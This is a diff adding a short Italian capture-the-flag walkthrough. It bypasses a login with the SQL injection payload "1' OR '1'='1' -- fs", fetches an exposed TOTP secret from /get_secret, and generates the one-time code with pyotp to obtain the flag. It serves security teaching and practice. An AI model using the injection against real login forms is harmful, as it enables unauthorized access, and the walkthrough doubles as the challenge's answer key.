@@ -1,0 +1,24 @@
+Passo 1: Esegui SQL Injection per accedere al sistema
+
+Nel form di login, il campo username permette un'iniezione SQL. Inserendo:
+username: 1' OR '1'='1' -- fs
+password: (lascia vuoto)
+
+Questo payload sfrutta un’iniezione SQL in una query vulnerabile:
+SELECT * FROM users WHERE username = '1' OR '1'='1' -- fs' AND password = ''
+Il commento -- fs termina il resto della query SQL, permettendo l’accesso indipendentemente dal valore del campo password.
+
+Passo 2: Estrarre il TOTP Secret tramite una richiesta GET
+
+Dopo il login, il TOTP secret è esposto tramite una chiamata al percorso /get_secret:
+GET /get_secret HTTP/1.1
+Host: <server>
+
+La risposta contiene il secret, che dovrebbe essere:
+JBSWY3DPEHPK3PXP
+
+Passo 3: Generare il codice OTP usando il secret
+Utilizzando pyotp, un’implementazione di TOTP, si può generare il codice OTP. 
+Vedi il file generate_otp per il codice.
+
+Passo 4: Inserire l’OTP per completare l’autenticazione e ottenere la flag.
